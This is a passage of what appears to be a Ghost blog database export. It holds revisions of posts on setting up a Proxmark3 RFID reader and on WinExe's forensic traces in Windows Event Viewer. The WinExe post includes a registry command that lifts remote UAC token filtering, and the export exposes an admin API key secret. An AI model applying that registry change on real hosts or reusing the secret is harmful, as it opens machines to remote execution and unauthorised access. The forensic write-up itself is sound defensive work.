5d815f3d992f0652efb510b3","resource_id":"5d815601992f0652efb51051","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-09-17T22:33:33.000Z"},{"id":"5d815f7d992f0652efb510b4","resource_id":"5d815601992f0652efb51051","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-09-17T22:34:37.000Z"},{"id":"5d816059992f0652efb510b5","resource_id":"5d815601992f0652efb51051","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-09-17T22:38:17.000Z"}],"api_keys":[{"id":"5d2754b5992f0652efb50e7d","type":"admin","secret":"02fcbe0633e51be688dc0a3d182904715f678921238fbcb66d655469241707e2","role_id":"5d2754b3992f0652efb50e26","integration_id":"5d2754b5992f0652efb50e7c","last_seen_at":null,"last_seen_version":null,"created_at":"2019-07-11T15:24:37.000Z","updated_at":"2019-07-11T15:24:37.000Z"}],"app_fields":[],"app_settings":[],"apps":[],"brute":[{"key":"KNzEKZCNG/DLFJeQMjRgh+xn0PQVRgGFG//q1bO/TWE=","firstRequest":1581605877089,"lastRequest":1581605877089,"lifetime":1581609477095,"count":1}],"integrations":[{"id":"5d2754b5992f0652efb50e7c","type":"builtin","name":"Zapier","slug":"zapier","icon_image":null,"description":"Built-in Zapier integration","created_at":"2019-07-11T15:24:37.000Z","updated_at":"2019-07-11T15:24:37.000Z"}],"invites":[],"members":[],"migrations":[{"id":1,"name":"1-create-tables.js","version":"init","currentVersion":"2.25"},{"id":2,"name":"2-create-fixtures.js","version":"init","currentVersion":"2.25"},{"id":3,"name":"1-post-excerpt.js","version":"1.3","currentVersion":"2.25"},{"id":4,"name":"1-codeinjection-post.js","version":"1.4","currentVersion":"2.25"},{"id":5,"name":"1-og-twitter-post.js","version":"1.5","currentVersion":"2.25"},{"id":6,"name":"1-add-backup-client.js","version":"1.7","currentVersion":"2.25"},{"id":7,"name":"1-add-permissions-redirect.js","version":"1.9","currentVersion":"2.25"},{"id":8,"name":"1-custom-template-post.js","version":"1.13","currentVersion":"2.25"},{"id":9,"name":"2-theme-permissions.js","version":"1.13","currentVersion":"2.25"},{"id":10,"name":"1-add-webhooks-table.js","version":"1.18","currentVersion":"2.25"},{"id":11,"name":"1-webhook-permissions.js","version":"1.19","currentVersion":"2.25"},{"id":12,"name":"1-remove-settings-keys.js","version":"1.20","currentVersion":"2.25"},{"id":13,"name":"1-add-contributor-role.js","version":"1.21","currentVersion":"2.25"},{"id":14,"name":"1-multiple-authors-DDL.js","version":"1.22","currentVersion":"2.25"},{"id":15,"name":"1-multiple-authors-DML.js","version":"1.22","currentVersion":"2.25"},{"id":16,"name":"1-update-koenig-beta-html.js","version":"1.25","currentVersion":"2.25"},{"id":17,"name":"2-demo-post.js","version":"1.25","currentVersion":"2.25"},{"id":18,"name":"1-rename-amp-column.js","version":"2.0","currentVersion":"2.25"},{"id":19,"name":"2-update-posts.js","version":"2.0","currentVersion":"2.25"},{"id":20,"name":"3-remove-koenig-labs.js","version":"2.0","currentVersion":"2.25"},{"id":21,"name":"4-permalink-setting.js","version":"2.0","currentVersion":"2.25"},{"id":22,"name":"5-remove-demo-post.js","version":"2.0","currentVersion":"2.25"},{"id":23,"name":"6-replace-fixture-posts.js","version":"2.0","currentVersion":"2.25"},{"id":24,"name":"1-add-sessions-table.js","version":"2.2","currentVersion":"2.25"},{"id":25,"name":"2-add-integrations-and-api-key-tables.js","version":"2.2","currentVersion":"2.25"},{"id":26,"name":"3-insert-admin-integration-role.js","version":"2.2","currentVersion":"2.25"},{"id":27,"name":"4-insert-integration-and-api-key-permissions.js","version":"2.2","currentVersion":"2.25"},{"id":28,"name":"5-add-mobiledoc-revisions-table.js","version":"2.2","currentVersion":"2.25"},{"id":29,"name":"1-add-webhook-columns.js","version":"2.3","currentVersion":"2.25"},{"id":30,"name":"2-add-webhook-edit-permission.js","version":"2.3","currentVersion":"2.25"},{"id":31,"name":"1-add-webhook-permission-roles.js","version":"2.6","currentVersion":"2.25"},{"id":32,"name":"1-add-members-table.js","version":"2.8","currentVersion":"2.25"},{"id":33,"name":"1-remove-empty-strings.js","version":"2.13","currentVersion":"2.25"},{"id":34,"name":"1-add-actions-table.js","version":"2.14","currentVersion":"2.25"},{"id":35,"name":"2-add-actions-permissions.js","version":"2.14","currentVersion":"2.25"},{"id":36,"name":"1-add-type-column-to-integrations.js","version":"2.15","currentVersion":"2.25"},{"id":37,"name":"2-insert-zapier-integration.js","version":"2.15","currentVersion":"2.25"},{"id":38,"name":"1-add-members-perrmissions.js","version":"2.16","currentVersion":"2.25"},{"id":39,"name":"1-normalize-settings.js","version":"2.17","currentVersion":"2.25"},{"id":40,"name":"2-posts-add-canonical-url.js","version":"2.17","currentVersion":"2.25"},{"id":41,"name":"1-restore-settings-from-backup.js","version":"2.18","currentVersion":"2.25"},{"id":42,"name":"1-update-editor-permissions.js","version":"2.21","currentVersion":"2.25"},{"id":43,"name":"1-add-member-permissions-to-roles.js","version":"2.22","currentVersion":"2.25"}],"migrations_lock":[{"lock_key":"km01","locked":0,"acquired_at":"2019-07-11T15:24:30.000Z","released_at":"2019-07-11T15:24:37.000Z"}],"mobiledoc_revisions":[{"id":"5d6fb394992f0652efb50f93","post_id":"5d6eb8f7992f0652efb50f88","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"image\",{\"src\":\"/content/images/2018/08/IMG_20180807_200701.jpg\"}],[\"code\",{\"code\":\"proxmark3> hw tune\\n\\nMeasuring antenna characteristics, please wait.........\\n# LF antenna: 21.04 V @   125.00 kHz\\n# LF antenna: 18.29 V @   134.00 kHz\\n# LF optimal: 21.04 V @   125.00 kHz\\n# HF antenna: 22.51 V @    13.56 MHz\\nDisplaying LF tuning graph. Divisor 89 is 134khz, 95 is 125khz.\"}]],\"markups\":[[\"a\",[\"href\",\"https://github.com/Proxmark/proxmark3/wiki/Windows\"]],[\"a\"],[\"a\",[\"href\",\"https://github.com/Proxmark/proxmark3/wiki/Ubuntu-Linux\"]],[\"a\",[\"href\",\"https://github.com/Proxmark/proxmark3/wiki/Kali-Linux\"]],[\"a\",[\"href\",\"https://github.com/Proxmark/proxmark3/wiki/MacOS\"]],[\"a\",[\"href\",\"https://github.com/Proxmark/proxmark3/wiki/Gentoo-Linux\"]],[\"a\",[\"href\",\"https://github.com/Proxmark/proxmark3/wiki/android\"]],[\"code\"]],\"sections\":[[1,\"p\",[[0,[],0,\"It took me several hours to get the Proxmark3 Easy up and running the first time. I had no idea what I was doing and couldn't find much information specific to the Proxmark3 Easy.\"]]],[1,\"p\",[[0,[],0,\"The one significant difference of the Proxmark3 Easy compared to the previous generations is that the Easy only has half the amount of storage in the microcontroller (256kb instead of 512kb). However, this will not matter if you are using the official Proxmark3 firmware.\"]]],[10,0],[1,\"p\",[[0,[],0,\"The first thing you want to do when you get your new Proxmark3 Easy is to download the latest official Proxmark3 client and firmware. Here are some tutorials for common operating systems: \"],[0,[0],1,\"Windows\"],[0,[1],1,\",\"],[0,[],0,\" \"],[0,[2],1,\"Ubuntu\"],[0,[1],1,\",\"],[0,[],0,\" \"],[0,[3],1,\"Kali\"],[0,[1],1,\",\"],[0,[],0,\" \"],[0,[4],1,\"Mac OS\"],[0,[1],1,\",\"],[0,[],0,\" \"],[0,[5],1,\"Gentoo\"],[0,[1],1,\",\"],[0,[],0,\" and \"],[0,[6],1,\"Android\"],[0,[],0,\".\"]]],[1,\"p\",[[0,[],0,\"When you are flashing your Proxmark3 Easy, make sure you flash both the bootloader and the main firmware. I tried flashing just the main firmware since I already had the newer CDC bootloader, but it caused the Proxmark3 to bootloop.\"]]],[1,\"p\",[[0,[],0,\"To flash the bootloader and firmware, you want to hold down the button on the side of the Proxmark3 when you plug it in. This will put the Proxmark3 into a flashable state. It should be obvious that it's in a different mode by the flashing of the LEDs on the Proxmark3 board.\"]]],[1,\"p\",[[0,[],0,\"You should always use the latest firmware and client, where possible. At the very least, you should always ensure that the client and the firmware running on the Proxmark3 are the same version.\"]]],[1,\"p\",[[0,[],0,\"Once you get it flashed, you can run the client using \"],[0,[7],1,\"client/proxmark3 /dev/ttyACM0\"],[0,[],0,\" from the proxmark3 folder. You may need to substitute /dev/ttyACM0 with the appropriate TTY device.\"]]],[1,\"p\",[[0,[],0,\"To make sure everything works as expected, try \"],[0,[7],1,\"hw tune\"],[0,[],0,\" to ensure both antennas are working and responding correctly:\"]]],[10,1],[1,\"p\",[[0,[],0,\"Now try reading an RFID key using \"],[0,[7],1,\"hf search\"],[0,[],0,\" if it is 13.56 MHz or \"],[0,[7],1,\"lf search\"],[0,[],0,\" if it is 125kHz.\"]]]]}","created_at_ts":1567601556044,"created_at":"2019-09-04T12:52:36.000Z"},{"id":"5d6fb394992f0652efb50f94","post_id":"5d6eb8f7992f0652efb50f88","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"image\",{\"src\":\"/content/images/2019/09/Proxmark3_Easy.jpg\"}],[\"code\",{\"code\":\"proxmark3> hw tune\\n\\nMeasuring antenna characteristics, please wait.........\\n# LF antenna: 21.04 V @   125.00 kHz\\n# LF antenna: 18.29 V @   134.00 kHz\\n# LF optimal: 21.04 V @   125.00 kHz\\n# HF antenna: 22.51 V @    13.56 MHz\\nDisplaying LF tuning graph. Divisor 89 is 134khz, 95 is 125khz.\"}]],\"markups\":[[\"a\",[\"href\",\"https://github.com/Proxmark/proxmark3/wiki/Windows\"]],[\"a\"],[\"a\",[\"href\",\"https://github.com/Proxmark/proxmark3/wiki/Ubuntu-Linux\"]],[\"a\",[\"href\",\"https://github.com/Proxmark/proxmark3/wiki/Kali-Linux\"]],[\"a\",[\"href\",\"https://github.com/Proxmark/proxmark3/wiki/MacOS\"]],[\"a\",[\"href\",\"https://github.com/Proxmark/proxmark3/wiki/Gentoo-Linux\"]],[\"a\",[\"href\",\"https://github.com/Proxmark/proxmark3/wiki/android\"]],[\"code\"]],\"sections\":[[1,\"p\",[[0,[],0,\"It took me several hours to get the Proxmark3 Easy up and running the first time. I had no idea what I was doing and couldn't find much information specific to the Proxmark3 Easy.\"]]],[1,\"p\",[[0,[],0,\"The one significant difference of the Proxmark3 Easy compared to the previous generations is that the Easy only has half the amount of storage in the microcontroller (256kb instead of 512kb). However, this will not matter if you are using the official Proxmark3 firmware.\"]]],[10,0],[1,\"p\",[[0,[],0,\"The first thing you want to do when you get your new Proxmark3 Easy is to download the latest official Proxmark3 client and firmware. Here are some tutorials for common operating systems: \"],[0,[0],1,\"Windows\"],[0,[1],1,\",\"],[0,[],0,\" \"],[0,[2],1,\"Ubuntu\"],[0,[1],1,\",\"],[0,[],0,\" \"],[0,[3],1,\"Kali\"],[0,[1],1,\",\"],[0,[],0,\" \"],[0,[4],1,\"Mac OS\"],[0,[1],1,\",\"],[0,[],0,\" \"],[0,[5],1,\"Gentoo\"],[0,[1],1,\",\"],[0,[],0,\" and \"],[0,[6],1,\"Android\"],[0,[],0,\".\"]]],[1,\"p\",[[0,[],0,\"When you are flashing your Proxmark3 Easy, make sure you flash both the bootloader and the main firmware. I tried flashing just the main firmware since I already had the newer CDC bootloader, but it caused the Proxmark3 to bootloop.\"]]],[1,\"p\",[[0,[],0,\"To flash the bootloader and firmware, you want to hold down the button on the side of the Proxmark3 when you plug it in. This will put the Proxmark3 into a flashable state. It should be obvious that it's in a different mode by the flashing of the LEDs on the Proxmark3 board.\"]]],[1,\"p\",[[0,[],0,\"You should always use the latest firmware and client, where possible. At the very least, you should always ensure that the client and the firmware running on the Proxmark3 are the same version.\"]]],[1,\"p\",[[0,[],0,\"Once you get it flashed, you can run the client using \"],[0,[7],1,\"client/proxmark3 /dev/ttyACM0\"],[0,[],0,\" from the proxmark3 folder. You may need to substitute /dev/ttyACM0 with the appropriate TTY device.\"]]],[1,\"p\",[[0,[],0,\"To make sure everything works as expected, try \"],[0,[7],1,\"hw tune\"],[0,[],0,\" to ensure both antennas are working and responding correctly:\"]]],[10,1],[1,\"p\",[[0,[],0,\"Now try reading an RFID key using \"],[0,[7],1,\"hf search\"],[0,[],0,\" if it is 13.56 MHz or \"],[0,[7],1,\"lf search\"],[0,[],0,\" if it is 125kHz.\"]]]]}","created_at_ts":1567601556045,"created_at":"2019-09-04T12:52:36.000Z"},{"id":"5d71200d992f0652efb5103a","post_id":"5d711606992f0652efb50fa3","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"html\",{\"html\":\"ERROR: Failed to install service winexesvc - NT_STATUS_ACCESS_DENIED\"}],[\"html\",{\"html\":\"reg add \\\"HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\system\\\" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f\"}],[\"image\",{\"src\":\"/content/images/2019/09/Screen-Shot-2019-09-05-at-10.02.36-AM.png\"}],[\"image\",{\"src\":\"/content/images/2019/09/Screen-Shot-2019-09-04-at-4.10.38-PM.png\",\"cardWidth\":\"wide\",\"caption\":\"System Event ID 7045 fired during the winexesvc service creation.\"}],[\"image\",{\"src\":\"/content/images/2019/09/Screen-Shot-2019-09-04-at-4.13.46-PM.png\",\"cardWidth\":\"wide\",\"caption\":\"Security Event ID 4624 fired for the WinExe authentication event.\"}],[\"image\",{\"src\":\"/content/images/2019/09/Screen-Shot-2019-09-04-at-4.09.41-PM.png\",\"caption\":\"System Event ID 7036 fires for the service stopping and starting.\",\"cardWidth\":\"wide\"}]],\"markups\":[],\"sections\":[[1,\"p\",[[0,[],0,\"WinExe is a utility that allows linux hosts to remotely execute commands on a Windows machine. The functionality is very similar to PsExec.\"]]],[1,\"p\",[[0,[],0,\"Recently, an antivirus alert fired for the C:\\\\Windows\\\\winexesvc.exe executable. It is classified as Riskware or as a Hacktool. Googling around, it appears that WinExe was being used by APT28 (Fancy Bear) as a lateral movement tool. However, since it can be used for legitimate management purposes, it's unwise to jump to conclusions before getting the full picture. This post outlines the artifacts left on the system after it has been used, specifically in Windows Event Viewer.\"]]],[1,\"p\",[[0,[],0,\"To investigate WinExe, I spun up a lab environment in Virtualbox consisting of Parrot OS and Windows 7.\"]]],[1,\"p\",[[0,[],0,\"The first hurdle I encountered was hitting the following error when trying to run WinExe on Parrot against the Windows 7 machine:\"]]],[10,0],[1,\"p\",[[0,[],0,\"To fix this issue, I had to run a registry fix on the Windows 7 host:\"]]],[10,1],[1,\"p\",[[0,[],0,\"After running that regfix, WinExe now functions normally:\"]]],[10,2],[1,\"p\",[[0,[],0,\"The three screenshots below outline the forensic artifacts left behind in Windows Event Viewer. As you can see, not a whole lot of useful information is displayed. For example, there are no events created for commands run through WinExe.\"]]],[10,3],[10,4],[10,5],[1,\"p\",[]]]}","created_at_ts":1567694861732,"created_at":"2019-09-05T14:47:41.000Z"},{"id":"5d71201d992f0652efb5103c","post_id":"5d711606992f0652efb50fa3","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"html\",{\"html\":\"ERROR: Failed to install service winexesvc - NT_STATUS_ACCESS_DENIED\"}],[\"html\",{\"html\":\"reg add \\\"HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\system\\\" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f\"}],[\"image\",{\"src\":\"/content/images/2019/09/Screen-Shot-2019-09-05-at-10.02.36-AM.png\"}],[\"image\",{\"src\":\"/content/images/2019/09/Screen-Shot-2019-09-04-at-4.10.38-PM.png\",\"cardWidth\":\"wide\",\"caption\":\"System Event ID 7045 fired during the winexesvc service creation.\"}],[\"image\",{\"src\":\"/content/images/2019/09/Screen-Shot-2019-09-04-at-4.13.46-PM.png\",\"cardWidth\":\"wide\",\"caption\":\"Security Event ID 4624 fired for the WinExe authentication event.\"}],[\"image\",{\"src\":\"/content/images/2019/09/Screen-Shot-2019-09-04-at-4.09.41-PM.png\",\"caption\":\"System Event ID 7036 fires for the service stopping and starting.\",\"cardWidth\":\"wide\"}]],\"markups\":[],\"sections\":[[1,\"p\",[[0,[],0,\"WinExe is a utility that allows linux hosts to remotely execute commands on a Windows machine. The functionality is very similar to PsExec.\"]]],[1,\"p\",[[0,[],0,\"Recently, an antivirus alert fired for the C:\\\\Windows\\\\winexesvc.exe executable. It is classified as Riskware or as a Hacktool when searching the hash on VirusTotal. Googling around, it appears that WinExe was being used by APT28 (Fancy Bear) as a lateral movement tool. However, since it can be used for legitimate management purposes, it's unwise to jump to conclusions before getting the full picture. This post outlines the artifacts left on the system after it has been used, specifically in Windows Event Viewer.\"]]],[1,\"p\",[[0,[],0,\"To investigate WinExe, I spun up a lab environment in Virtualbox consisting of Parrot OS and Windows 7.\"]]],[1,\"p\",[[0,[],0,\"The first hurdle I encountered was hitting the following error when trying to run WinExe on Parrot against the Windows 7 machine:\"]]],[10,0],[1,\"p\",[[0,[],0,\"To fix this issue, I had to run a registry fix on the Windows 7 host:\"]]],[10,1],[1,\"p\",[[0,[],0,\"After running that regfix, WinExe now functions normally:\"]]],[10,2],[1,\"p\",[[0,[],0,\"The three screenshots below outline the forensic artifacts left behind in Windows Event Viewer. As you can see, not a whole lot of useful information is displayed. For example, there are no events created for commands run through WinExe.\"]]],[10,3],[10,4],[10,5],[1,\"p\",[]]]}","created_at_ts":1567694877504,"created_at":"2019-09-05T14:47:57.000Z"},{"id":"5d712036992f0652efb5103e","post_id":"5d711606992f0652efb50fa3","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"html\",{\"html\":\"ERROR: Failed to install service winexesvc - NT_STATUS_ACCESS_DENIED\"}],[\"html\",{\"html\":\"reg add \\\"HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\system\\\" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f\"}],[\"image\",{\"src\":\"/content/images/2019/09/Screen-Shot-2019-09-05-at-10.02.36-AM.png\"}],[\"image\",{\"src\":\"/content/images/2019/09/Screen-Shot-2019-09-04-at-4.10.38-PM.png\",\"cardWidth\":\"wide\",\"caption\":\"System Event ID 7045 fired during the winexesvc service creation.\"}],[\"image\",{\"src\":\"/content/images/2019/09/Screen-Shot-2019-09-04-at-4.13.46-PM.png\",\"cardWidth\":\"wide\",\"caption\":\"Security Event ID 4624 fired for the WinExe authentication event.\"}],[\"image\",{\"src\":\"/content/images/2019/09/Screen-Shot-2019-09-04-at-4.09.41-PM.png\",\"caption\":\"System Event ID 7036 fires for the service stopping and starting.\",\"cardWidth\":\"wide\"}]],\"markups\":[],\"sections\":[[1,\"p\",[[0,[],0,\"WinExe is a utility that allows linux hosts to remotely execute commands on a Windows machine. The functionality is very similar to PsExec.\"]]],[1,\"p\",[[0,[],0,\"Recently, an antivirus alert fired for the C:\\\\Windows\\\\winexesvc.exe executable. It is classified as Riskware or as a Hacktool when searching the hash on VirusTotal. Googling around, it appears that WinExe was being used by APT28 (Fancy Bear) as a lateral movement tool. However, since it can be used for legitimate management purposes, it is unwise to jump to conclusions before getting the full picture. This post outlines the artifacts left on the system after it has been used, specifically in Windows Event Viewer.\"]]],[1,\"p\",[[0,[],0,\"To investigate WinExe, I spun up a lab environment in Virtualbox consisting of Parrot OS and Windows 7.\"]]],[1,\"p\",[[0,[],0,\"The first hurdle I encountered was hitting the following error when trying to run WinExe on Parrot against the Windows 7 machine:\"]]],[10,0],[1,\"p\",[[0,[],0,\"To fix this issue, I had to run a registry fix on the Windows 7 host:\"]]],[10,1],[1,\"p\",[[0,[],0,\"After running that regfix, WinExe now functions normally:\"]]],[10,2],[1,\"p\",[[0,[],0,\"The three screenshots below outline the forensic artifacts left behind in Windows Event Viewer. As you can see, not a whole lot of useful information is displayed. For example, there are no events created for commands run through WinExe.\"]]],[10,3],[10,4],[10,5],[1,\"p\",[]]]}","created_at_ts":1567694902085,"created_at":"2019-09-05T14:48:22.000Z"},{"id":"5d712045992f0652efb51040","post_id":"5d711606992f0652efb50fa3","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"html\",{\"html\":\"ERROR: Failed to install service winexesvc - NT_STATUS_ACCESS_DENIED\"}],[\"html\",{\"html\":\"reg add \\\"HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\system\\\" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f\"}],[\"image\",{\"src\":\"/content/images/2019/09/Screen-Shot-2019-09-05-at-10.02.36-AM.png\"}],[\"image\",{\"src\":\"/content/images/2019/09/Screen-Shot-2019-09-04-at-4.10.38-PM.png\",\"cardWidth\":\"wide\",\"caption\":\"System Event ID 7045 fired during the winexesvc service creation.\"}],[\"image\",{\"src\":\"/content/images/2019/09/Screen-Shot-2019-09-04-at-4.13.46-PM.png\",\"cardWidth\":\"wide\",\"caption\":\"Security Event ID 4624 fired for the WinExe authentication event.\"}],[\"image\",{\"src\":\"/content/images/2019/09/Screen-Shot-2019-09-04-at-4.09.41-PM.png\",\"caption\":\"System Event ID 7036 fires for the service stopping and starting.\",\"cardWidth\":\"wide\"}]],\"markups\":[],\"sections\":[[1,\"p\",[[0,[],0,\"WinExe is a utility that allows linux hosts to remotely execute commands on a Windows machine. The functionality is very similar to PsExec.\"]]],[1,\"p\",[[0,[],0,\"Recently, an antivirus alert fired for the C:\\\\Windows\\\\winexesvc.exe executable. It is classified as Riskware or as a Hacktool when searching the hash on VirusTotal. Googling around, it appears that WinExe was being used by APT28 (Fancy Bear) as a lateral movement tool. However, since it can be used for legitimate management purposes, it is unwise to jump to conclusions before getting more context. This post outlines the artifacts left on the system after it has been used, specifically in Windows Event Viewer.\"]]],[1,\"p\",[[0,[],0,\"To investigate WinExe, I spun up a lab environment in Virtualbox consisting of Parrot OS and Windows 7.\"]]],[1,\"p\",[[0,[],0,\"The first hurdle I encountered was hitting the following error when trying to run WinExe on Parrot against the Windows 7 machine:\"]]],[10,0],[1,\"p\",[[0,[],0,\"To fix this issue, I had to run a registry fix on the Windows 7 host:\"]]],[10,1],[1,\"p\",[[0,[],0,\"After running that regfix, WinExe now functions normally:\"]]],[10,2],[1,\"p\",[[0,[],0,\"The three screenshots below outline the forensic artifacts left behind in Windows Event Viewer. As you can see, not a whole lot of useful information is displayed. For example, there are no events created for commands run through WinExe.\"]]],[10,3],[10,4],[10,5],[1,\"p\",[]]]}","created_at_ts":1567694917420,"created_at":"2019-09-05T14:48:37.000Z"},{"id":"5d7120b6992f0652efb51042","post_id":"5d711606992f0652efb50fa3","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"html\",{\"html\":\"ERROR: Failed to install service winexesvc - NT_STATUS_ACCESS_DENIED\"}],[\"html\",{\"html\":\"reg add \\\"HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\system\\\" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f\"}],[\"image\",{\"src\":\"/content/images/2019/09/Screen-Shot-2019-09-05-at-10.02.36-AM.png\"}],[\"image\",{\"src\":\"/content/images/2019/09/Screen-Shot-2019-09-04-at-4.10.38-PM.png\",\"cardWidth\":\"wide\",\"caption\":\"System Event ID 7045 fired during the winexesvc service creation.\"}],[\"image\",{\"src\":\"/content/images/2019/09/Screen-Shot-2019-09-04-at-4.13.46-PM.png\",\"cardWidth\":\"wide\",\"caption\":\"Security Event ID 4624 fired for the WinExe authentication event.\"}],[\"image\",{\"src\":\"/content/images/2019/09/Screen-Shot-2019-09-04-at-4.09.41-PM.png\",\"caption\":\"System Event ID 7036 fires for the service stopping and starting.\",\"cardWidth\":\"wide\"}]],\"markups\":[],\"sections\":[[1,\"p\",[[0,[],0,\"WinExe is a utility that allows linux hosts to remotely execute commands on a Windows machine. The functionality is very similar to PsExec.\"]]],[1,\"p\",[[0,[],0,\"Recently, an antivirus alert fired for the C:\\\\Windows\\\\winexesvc.exe executable. It is classified as Riskware or as a Hacktool when searching the hash on VirusTotal. Googling around, it appears that WinExe was being used by APT28 (Fancy Bear) as a lateral movement tool. However, since it can be used for legitimate management purposes, it is unwise to jump to conclusions before getting more context. This post outlines the artifacts left on the system after it has been used, specifically in Windows Event Viewer so that others facing this alert can .\"]]],[1,\"p\",[[0,[],0,\"To investigate WinExe, I spun up a lab environment in Virtualbox consisting of Parrot OS and Windows 7.\"]]],[1,\"p\",[[0,[],0,\"The first hurdle I encountered was hitting the following error when trying to run WinExe on Parrot against the Windows 7 machine:\"]]],[10,0],[1,\"p\",[[0,[],0,\"To fix this issue, I had to run a registry fix on the Windows 7 host:\"]]],[10,1],[1,\"p\",[[0,[],0,\"After running that regfix, WinExe now functions normally:\"]]],[10,2],[1,\"p\",[[0,[],0,\"The three screenshots below outline the forensic artifacts left behind in Windows Event Viewer. As you can see, not a whole lot of useful information is displayed. For example, there are no events created for commands run through WinExe.\"]]],[10,3],[10,4],[10,5],[1,\"p\",[]]]}","created_at_ts":1567695030044,"created_at":"2019-09-05T14:50:30.000Z"},{"id":"5d712103992f0652efb51044","post_id":"5d711606992f0652efb50fa3","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"html\",{\"html\":\"ERROR: Failed to install service winexesvc - NT_STATUS_ACCESS_DENIED\"}],[\"html\",{\"html\":\"reg add \\\"HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\system\\\" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f\"}],[\"image\",{\"src\":\"/content/images/2019/09/Screen-Shot-2019-09-05-at-10.02.36-AM.png\"}],[\"image\",{\"src\":\"/content/images/2019/09/Screen-Shot-2019-09-04-at-4.10.38-PM.png\",\"cardWidth\":\"wide\",\"caption\":\"System Event ID 7045 fired during the winexesvc service creation.\"}],[\"image\",{\"src\":\"/content/images/2019/09/Screen-Shot-2019-09-04-at-4.13.46-PM.png\",\"cardWidth\":\"wide\",\"caption\":\"Security Event ID 4624 fired for the WinExe authentication event.\"}],[\"image\",{\"src\":\"/content/images/2019/09/Screen-Shot-2019-09-04-at-4.09.41-PM.png\",\"caption\":\"System Event ID 7036 fires for the service stopping and starting.\",\"cardWidth\":\"wide\"}]],\"markups\":[],\"sections\":[[1,\"p\",[[0,[],0,\"WinExe is a utility that allows linux hosts to remotely execute commands on a Windows machine. The functionality is very similar to PsExec.\"]]],[1,\"p\",[[0,[],0,\"Recently, an antivirus alert fired for the C:\\\\Windows\\\\winexesvc.exe executable. It is classified as Riskware or as a Hacktool when searching the hash on VirusTotal. Googling around, it appears that WinExe was being used by APT28 (Fancy Bear) as a lateral movement tool. However, since it can be used for legitimate management purposes, it is unwise to jump to conclusions before getting more context. This post outlines the artifacts left on the system after it has been used, specifically in Windows Event Viewer so that others facing this alert can create a timeline and find relevant information.\"]]],[1,\"p\",[[0,[],0,\"To investigate WinExe, I spun up a lab environment in Virtualbox consisting of Parrot OS and Windows 7.\"]]],[1,\"p\",[[0,[],0,\"The first hurdle I encountered was hitting the following error when trying to run WinExe on Parrot against the Windows 7 machine:\"]]],[10,0],[1,\"p\",[[0,[],0,\"To fix this issue, I had to run a registry fix on the Windows 7 host:\"]]],[10,1],[1,\"p\",[[0,[],0,\"After running that regfix, WinExe now functions normally:\"]]],[10,2],[1,\"p\",[[0,[],0,\"The three screenshots below outline the forensic artifacts left behind in Windows Event Viewer. As you can see, not a whole lot of useful information is displayed. For example, there are no events created for commands run through WinExe.\"]]],[10,3],[10,4],[10,5],[1,\"p\",[]]]}","created_at_ts":1567695107150,"created_at":"2019-09-05T14:51:47.000Z"},{"id":"5d71211f992f0652efb51046","post_id":"5d711606992f0652efb50fa3","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"html\",{\"html\":\"ERROR: Failed to install service winexesvc - NT_STATUS_ACCESS_DENIED\"}],[\"html\",{\"html\":\"reg add \\\"HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\system\\\" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f\"}],[\"image\",{\"src\":\"/content/images/2019/09/Screen-Shot-2019-09-05-at-10.02.36-AM.png\"}],[\"image\",{\"src\":\"/content/images/2019/09/Screen-Shot-2019-09-04-at-4.10.38-PM.png\",\"cardWidth\":\"wide\",\"caption\":\"System Event ID 7045 fired during the winexesvc service creation.\"}],[\"image\",{\"src\":\"/content/images/2019/09/Screen-Shot-2019-09-04-at-4.13.46-PM.png\",\"cardWidth\":\"wide\",\"caption\":\"Security Event ID 4624 fired for the WinExe authentication event.\"}],[\"image\",{\"src\":\"/content/images/2019/09/Screen-Shot-2019-09-04-at-4.09.41-PM.png\",\"caption\":\"System Event ID 7036 fires for the service stopping and starting.\",\"cardWidth\":\"wide\"}]],\"markups\":[],\"sections\":[[1,\"p\",[[0,[],0,\"WinExe is a utility that allows linux hosts to remotely execute commands on a Windows machine. The functionality is very similar to PsExec.\"]]],[1,\"p\",[[0,[],0,\"Recently, an antivirus alert fired for the C:\\\\Windows\\\\winexesvc.exe executable. It is classified as Riskware or as a Hacktool when searching the hash on VirusTotal. Googling around, it appears that WinExe was being used by APT28 (Fancy Bear) as a lateral movement tool. However, since it can be used for legitimate management purposes, it is unwise to jump to conclusions before getting more context. This post outlines the artifacts left on the system after it has been used, specifically in Windows Event Viewer so that others facing this alert can create a timeline and find relevant information.\"]]],[1,\"p\",[[0,[],0,\"To investigate WinExe, I spun up a lab environment in Virtualbox consisting of Parrot OS and Windows 7.\"]]],[1,\"p\",[[0,[],0,\"The first hurdle I encountered was hitting the following error when trying to run WinExe on Parrot against the Windows 7 